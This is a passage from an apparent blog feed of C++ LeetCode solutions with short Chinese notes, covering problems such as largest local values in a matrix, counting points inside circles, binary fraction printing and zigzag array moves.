i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(j &lt; n2) &#123;</span><br><span class="line">            ret.<span class="built_in">push_back</span>(&#123;items2[j][<span class="number">0</span>], items2[j][<span class="number">1</span>]&#125;);</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2373-矩阵中的局部最大值"><a href="#2373-矩阵中的局部最大值" class="headerlink" title="2373. 矩阵中的局部最大值"></a><a href="https://leetcode.cn/problems/largest-local-values-in-a-matrix/description/">2373. 矩阵中的局部最大值</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">largestLocal</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid) &#123;</span><br><span class="line">        <span class="type">int</span> n = grid.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ret = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n<span class="number">-2</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">-2</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; n<span class="number">-1</span>; j++) &#123;</span><br><span class="line">                ret[i<span class="number">-1</span>][j<span class="number">-1</span>] = <span class="built_in">max</span>(grid[i][j], <span class="built_in">max</span>(<span class="built_in">max</span>(<span class="built_in">max</span>(grid[i<span class="number">-1</span>][j], grid[i+<span class="number">1</span>][j]),<span class="built_in">max</span>(grid[i][j<span class="number">-1</span>], grid[i][j+<span class="number">1</span>])),<span class="built_in">max</span>(<span class="built_in">max</span>(grid[i+<span class="number">1</span>][j+<span class="number">1</span>], grid[i<span class="number">-1</span>][j<span class="number">-1</span>]),<span class="built_in">max</span>(grid[i<span class="number">-1</span>][j+<span class="number">1</span>], grid[i+<span class="number">1</span>][j<span class="number">-1</span>]))));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="1828-统计一个圆中点的数目"><a href="#1828-统计一个圆中点的数目" class="headerlink" title="1828. 统计一个圆中点的数目"></a>1828. 统计一个圆中点的数目</h2><h3 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">countPoints</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; xy = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(<span class="number">501</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">501</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span>&amp; p: points) &#123;</span><br><span class="line">            xy[p[<span class="number">0</span>]][p[<span class="number">1</span>]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> n = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ret</span><span class="params">(n, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">500</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">500</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(xy[i][j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; n; k++) &#123;</span><br><span class="line">                        <span class="type">int</span> x = queries[k][<span class="number">0</span>], y = queries[k][<span class="number">1</span>], r = queries[k][<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">if</span>((i - x)*(i - x) + (j - y)*(j - y) &lt;= r*r) &#123;</span><br><span class="line">                            ret[k] += xy[i][j];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>注意不同点可能有相同的坐标</p></blockquote><h3 id="更暴力"><a href="#更暴力" class="headerlink" title="更暴力"></a>更暴力</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">countPoints</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; points, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = points.<span class="built_in">size</span>(), n = queries.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; ret = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((queries[i][<span class="number">0</span>] - points[j][<span class="number">0</span>]) * (queries[i][<span class="number">0</span>] - points[j][<span class="number">0</span>]) + (queries[i][<span class="number">1</span>] - points[j][<span class="number">1</span>]) * (queries[i][<span class="number">1</span>] - points[j][<span class="number">1</span>]) &lt;= queries[i][<span class="number">2</span>] * queries[i][<span class="number">2</span>]) &#123;</span><br><span class="line">                    ret[i]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="面试题-05-02-二进制数转字符串"><a href="#面试题-05-02-二进制数转字符串" class="headerlink" title="面试题 05.02. 二进制数转字符串"></a>面试题 05.02. 二进制数转字符串</h2><h3 id="乘2法"><a href="#乘2法" class="headerlink" title="乘2法"></a>乘2法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">printBin</span><span class="params">(<span class="type">double</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        string res = <span class="string">&quot;0.&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(; count &lt; <span class="number">30</span> &amp;&amp; num &gt; <span class="number">0</span>; count++) &#123;</span><br><span class="line">            num *= <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> bit = num;</span><br><span class="line">            res.<span class="built_in">push_back</span>(bit+<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            num -= bit;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count &lt; <span class="number">30</span> ? res : <span class="string">&quot;ERROR&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ieee-754"><a href="#ieee-754" class="headerlink" title="ieee 754"></a>ieee 754</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">printBin</span><span class="params">(<span class="type">double</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *bit = (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)&amp;num;</span><br><span class="line">        string res = <span class="built_in">string</span>(<span class="number">64</span>, <span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> i = <span class="number">63</span>;</span><br><span class="line">        <span class="keyword">for</span>(; ((*bit)&amp;<span class="number">1</span>)==<span class="number">0</span>; i--, (*bit) &gt;&gt;= <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> last = i;</span><br><span class="line">        <span class="keyword">for</span>(; i &gt; <span class="number">11</span>; i--) &#123;</span><br><span class="line">            res[i - <span class="number">12</span>] += ((*bit)&amp;<span class="number">1</span>) + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            (*bit) &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> e = ((*bit) &amp; <span class="number">0x7ff</span>) - <span class="number">1023</span>;</span><br><span class="line">        string pre = <span class="string">&quot;0.&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(e &lt; <span class="number">-1</span>) &#123;</span><br><span class="line">            pre += <span class="built_in">string</span>(-e<span class="number">-1</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pre += <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> last<span class="number">-12</span> &lt; <span class="number">32</span><span class="number">-3</span>-(-e<span class="number">-1</span>) ? pre+res : <span class="string">&quot;ERROR&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>分别计算浮点数的尾数，阶码，在判断能否用32位保存下来</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1144-递减元素使数组呈锯齿状&quot;&gt;&lt;a href=&quot;#1144-递减元素使数组呈锯齿状&quot; class=&quot;headerlink&quot; title=&quot;1144. 递减元素使数组呈锯齿状&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/decrease-elements-to-make-array-zigzag/&quot;&gt;1144. 递减元素使数组呈锯齿状&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;movesToMakeZigzag&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; odd2less, even2less;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        odd2less = even2less = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n = nums.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n &amp;lt;= &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i &amp;lt; n - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(i%&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nums[i] &amp;gt;= &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;], nums[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    even2less += nums[i] - &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;], nums[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]) + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nums[i] &amp;gt;= &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;], nums[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    odd2less += nums[i] - &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;], nums[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]) + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nums[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] &amp;gt;= nums[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            even2less += nums[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] - nums[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nums[n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] &amp;gt;= nums[n&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)%&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                even2less += nums[n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] - nums[n&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                odd2less += nums[n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] - nums[n&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(even2less, odd2less);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;遍历所有奇数，使其小于两端，记录操作数1&lt;br&gt;遍历所有偶数，使其小于两端，记录操作数2&lt;br&gt;返回最小值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;优化代码行数&quot;&gt;&lt;a href=&quot;#优化代码行数&quot; class=&quot;headerlink&quot; title=&quot;优化代码行数&quot;&gt;&lt;/a&gt;优化代码行数&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;movesToMakeZigzag&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; op[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;, n = nums.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n &amp;lt;= &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i &amp;lt; n - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nums[i] &amp;gt;= &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;], nums[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                op[i&amp;amp;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] += nums[i] - &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;], nums[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]) + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nums[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] &amp;gt;= nums[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            op[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] += nums[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] - nums[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(nums[n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] &amp;gt;= nums[n&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            op[(n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)&amp;amp;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] += nums[n&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] - nums[n&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;] + &lt;span 